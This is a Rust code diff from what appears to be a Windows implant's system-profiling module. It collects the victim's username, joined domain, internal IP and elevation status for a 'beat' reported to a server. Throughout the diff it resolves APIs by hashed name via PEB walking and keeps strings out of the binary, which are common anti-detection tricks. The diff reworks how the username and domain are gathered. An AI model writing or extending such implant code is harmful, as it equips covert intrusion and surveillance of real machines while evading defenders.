@@ -12,26 +12,24 @@ use crate::runtime::bootstrap;
 const H_KERNEL32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("kernel32.dll");
 const H_ADVAPI32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("advapi32.dll");
 const H_IPHLPAPI: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("iphlpapi.dll");
-const H_NETAPI32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("netapi32.dll");
 
 // Runtime literals (declared in the anti-strings manifest): loaded on
 // demand — neither module is guaranteed in the PEB of a host process.
 const IPHLPAPI_DLL: &[u8] = b"iphlpapi.dll\0";
-const NETAPI32_DLL: &[u8] = b"netapi32.dll\0";
+const ADVAPI32_DLL: &[u8] = b"advapi32.dll\0";
 
 const H_LOAD_LIBRARY_A: u64 = fnv1a64(b"LoadLibraryA");
 const H_GET_IP_ADDR_TABLE: u64 = fnv1a64(b"GetIpAddrTable");
-const H_NET_GET_JOIN_INFORMATION: u64 = fnv1a64(b"NetGetJoinInformation");
-const H_NET_API_BUFFER_FREE: u64 = fnv1a64(b"NetApiBufferFree");
 const H_WIDE_CHAR_TO_MULTI_BYTE: u64 = fnv1a64(b"WideCharToMultiByte");
 const H_OPEN_PROCESS_TOKEN: u64 = fnv1a64(b"OpenProcessToken");
 const H_GET_TOKEN_INFORMATION: u64 = fnv1a64(b"GetTokenInformation");
+const H_GET_USER_NAME_W: u64 = fnv1a64(b"GetUserNameW");
+const H_GET_COMPUTER_NAME_EX_W: u64 = fnv1a64(b"GetComputerNameExW");
 const H_GET_ACP: u64 = fnv1a64(b"GetACP");
 const H_GET_OEMCP: u64 = fnv1a64(b"GetOEMCP");
 const H_GET_CURRENT_PROCESS_ID: u64 = fnv1a64(b"GetCurrentProcessId");
 const H_GET_CURRENT_THREAD_ID: u64 = fnv1a64(b"GetCurrentThreadId");
 const H_GET_COMPUTER_NAME_A: u64 = fnv1a64(b"GetComputerNameA");
-const H_GET_USER_NAME_A: u64 = fnv1a64(b"GetUserNameA");
 const H_GET_MODULE_FILE_NAME_A: u64 = fnv1a64(b"GetModuleFileNameA");
 const H_RTL_GET_VERSION: u64 = fnv1a64(b"RtlGetVersion");
 const H_GET_TIME_ZONE_INFORMATION: u64 = fnv1a64(b"GetTimeZoneInformation");
@@ -63,8 +61,8 @@ pub struct SysInfo {
     /// First non-loopback IPv4, raw dwAddr (network order in memory — the
     /// server renders the LE bytes as the dotted quad, see WIRE.md).
     pub internal_ip: u32,
-    /// Joined domain (NetGetJoinInformation, OEM/ACP bytes); empty in a
-    /// workgroup.
+    /// Joined domain (GetComputerNameExW ComputerNameDnsDomain, OEM/ACP
+    /// bytes); empty in a workgroup.
     pub domain: [u8; 32],
     pub domain_len: usize,
     /// Token elevation (TokenElevation) — beat flag bit 2.
@@ -232,18 +230,61 @@ pub unsafe fn collect(peb: *mut Peb, dbg: isize) -> SysInfo {
     }
     crate::runtime::debug::log_handle(dbg, b"si: tz ok\n");
 
-    if !advapi32.is_null() {
-        let p = export(advapi32, H_GET_USER_NAME_A);
-        if !p.is_null() {
-            let mut len: u32 = 64;
-            let ok = (core::mem::transmute::<
-                *const core::ffi::c_void,
-                unsafe extern "system" fn(*mut u8, *mut u32) -> i32,
-            >(p as *const core::ffi::c_void))(
-                info.username.as_mut_ptr(), &mut len
-            );
-            if ok != 0 {
-                info.username_len = len as usize;
+    // Username: advapi32!GetUserNameW (loaded lazily) then
+    // WideCharToMultiByte — the exact original recipe (GetUserNameA is a
+    // forwarded export on modern Windows; the wide entry is the real one).
+    let kernel32_load = export(kernel32, H_LOAD_LIBRARY_A);
+    if !kernel32_load.is_null() {
+        let load = core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(*const u8) -> *mut c_void,
+        >(kernel32_load as *const core::ffi::c_void);
+        let advapi32 = if advapi32.is_null() {
+            load(ADVAPI32_DLL.as_ptr())
+        } else {
+            advapi32
+        };
+        if !advapi32.is_null() {
+            let get_user_w = specter_core::peb::find_export(advapi32, H_GET_USER_NAME_W);
+            let to_mb = export(kernel32, H_WIDE_CHAR_TO_MULTI_BYTE);
+            if !get_user_w.is_null() && !to_mb.is_null() {
+                let get_user_w = core::mem::transmute::<
+                    *const core::ffi::c_void,
+                    unsafe extern "system" fn(*mut u16, *mut u32) -> i32,
+                >(get_user_w as *const core::ffi::c_void);
+                let to_mb = core::mem::transmute::<
+                    *const core::ffi::c_void,
+                    unsafe extern "system" fn(
+                        u32,        // CodePage (CP_ACP = 0)
+                        u32,        // dwFlags
+                        *const u16, // lpWideCharStr
+                        i32,        // cchWideChar (-1: NUL-terminated)
+                        *mut u8,    // lpMultiByteStr
+                        i32,        // cbMultiByte
+                        *const u8,  // lpDefaultChar
+                        *mut i32,   // lpUsedDefaultChar (LPBOOL)
+                    ) -> i32,
+                >(to_mb as *const core::ffi::c_void);
+                let mut wuser = [0u16; 256];
+                let mut wlen: u32 = 256;
+                if get_user_w(wuser.as_mut_ptr(), &mut wlen) != 0 {
+                    let n = to_mb(
+                        0,
+                        0,
+                        wuser.as_ptr(),
+                        -1,
+                        info.username.as_mut_ptr(),
+                        (info.username.len() - 1) as i32,
+                        core::ptr::null(),
+                        core::ptr::null_mut(),
+                    );
+                    // n counts the NUL; the beat field stops at it.
+                    if n > 0 && (n as usize) < info.username.len() {
+                        info.username_len = n as usize - 1;
+                    } else if n > 0 {
+                        info.username_len = info.username.len() - 1;
+                    }
+                }
             }
         }
     }
@@ -253,7 +294,6 @@ pub unsafe fn collect(peb: *mut Peb, dbg: isize) -> SysInfo {
     // (iphlpapi GetIpAddrTable, loaded on demand). dwAddr is stored raw —
     // network order in memory, which the server renders as the dotted
     // quad (see the beat contract, docs/WIRE.md).
-    let kernel32_load = export(kernel32, H_LOAD_LIBRARY_A);
     if !kernel32_load.is_null() {
         let load = core::mem::transmute::<
             *const core::ffi::c_void,
@@ -306,71 +346,49 @@ pub unsafe fn collect(peb: *mut Peb, dbg: isize) -> SysInfo {
     }
     crate::runtime::debug::log_handle(dbg, b"si: adapters ok\n");
 
-    // Joined domain: NetGetJoinInformation (netapi32, loaded on demand) —
-    // empty in a workgroup, the NetBIOS name of the joined domain
-    // otherwise. The returned buffer is freed with NetApiBufferFree.
-    if !kernel32_load.is_null() {
-        let load = core::mem::transmute::<
-            *const core::ffi::c_void,
-            unsafe extern "system" fn(*const u8) -> *mut c_void,
-        >(kernel32_load as *const core::ffi::c_void);
-        let netapi32 = specter_core::peb::find_module(peb, H_NETAPI32);
-        let netapi32 = if netapi32.is_null() {
-            load(NETAPI32_DLL.as_ptr())
-        } else {
-            netapi32
-        };
-        if !netapi32.is_null() {
-            let get_join = specter_core::peb::find_export(netapi32, H_NET_GET_JOIN_INFORMATION);
-            let free_buf = specter_core::peb::find_export(netapi32, H_NET_API_BUFFER_FREE);
-            let to_mb = export(kernel32, H_WIDE_CHAR_TO_MULTI_BYTE);
-            if !get_join.is_null() && !free_buf.is_null() && !to_mb.is_null() {
-                let get_join = core::mem::transmute::<
-                    *const core::ffi::c_void,
-                    unsafe extern "system" fn(*const u16, *mut *mut u16, *mut u32) -> u32,
-                >(get_join as *const core::ffi::c_void);
-                let free_buf = core::mem::transmute::<
-                    *const core::ffi::c_void,
-                    unsafe extern "system" fn(*mut c_void) -> u32,
-                >(free_buf as *const core::ffi::c_void);
-                let to_mb = core::mem::transmute::<
-                    *const core::ffi::c_void,
-                    unsafe extern "system" fn(
-                        u32,        // CodePage (CP_ACP = 0)
-                        u32,        // dwFlags
-                        *const u16, // lpWideCharStr
-                        i32,        // cchWideChar
-                        *mut u8,    // lpMultiByteStr
-                        i32,        // cbMultiByte
-                        *const u8,  // lpDefaultChar
-                        *mut i32,   // lpUsedDefaultChar (LPBOOL)
-                    ) -> i32,
-                >(to_mb as *const core::ffi::c_void);
-                let mut name_buf: *mut u16 = core::ptr::null_mut();
-                let mut status: u32 = 0;
-                if get_join(core::ptr::null(), &mut name_buf, &mut status) == 0
-                    && status == 3 // NETSETUP_DOMAIN_NAME: joined to a domain
-                    && !name_buf.is_null()
-                {
-                    // Bounded wide read, then OEM/ACP conversion.
-                    let mut wlen = 0usize;
-                    while wlen < 32 && unsafe { *name_buf.add(wlen) } != 0 {
-                        wlen += 1;
-                    }
-                    let n = to_mb(
-                        0, // CP_ACP
-                        0, // no flags
-                        name_buf,
-                        wlen as i32,
-                        info.domain.as_mut_ptr(),
-                        info.domain.len() as i32,
-                        core::ptr::null(),
-                        core::ptr::null_mut(),
-                    );
-                    if n > 0 && (n as usize) <= info.domain.len() {
-                        info.domain_len = n as usize;
-                    }
-                    free_buf(name_buf as *mut c_void);
+    // Joined domain: kernel32!GetComputerNameExW(ComputerNameDnsDomain)
+    // converted to OEM/ACP — the original's recipe (empty in a workgroup,
+    // the DNS name of the joined domain otherwise).
+    {
+        let get_name_ex = export(kernel32, H_GET_COMPUTER_NAME_EX_W);
+        let to_mb = export(kernel32, H_WIDE_CHAR_TO_MULTI_BYTE);
+        if !get_name_ex.is_null() && !to_mb.is_null() {
+            let get_name_ex = core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(u32, *mut u16, *mut u32) -> i32,
+            >(get_name_ex as *const core::ffi::c_void);
+            let to_mb = core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(
+                    u32,        // CodePage (CP_ACP = 0)
+                    u32,        // dwFlags
+                    *const u16, // lpWideCharStr
+                    i32,        // cchWideChar (-1: NUL-terminated)
+                    *mut u8,    // lpMultiByteStr
+                    i32,        // cbMultiByte
+                    *const u8,  // lpDefaultChar
+                    *mut i32,   // lpUsedDefaultChar (LPBOOL)
+                ) -> i32,
+            >(to_mb as *const core::ffi::c_void);
+            let mut wdomain = [0u16; 256];
+            let mut wlen: u32 = 256;
+            // 2 = ComputerNameDnsDomain.
+            if get_name_ex(2, wdomain.as_mut_ptr(), &mut wlen) != 0 {
+                let n = to_mb(
+                    0,
+                    0,
+                    wdomain.as_ptr(),
+                    -1,
+                    info.domain.as_mut_ptr(),
+                    (info.domain.len() - 1) as i32,
+                    core::ptr::null(),
+                    core::ptr::null_mut(),
+                );
+                // n counts the NUL; the beat field stops at it.
+                if n > 0 && (n as usize) < info.domain.len() {
+                    info.domain_len = n as usize - 1;
+                } else if n > 0 {
+                    info.domain_len = info.domain.len() - 1;
                 }
             }
         }
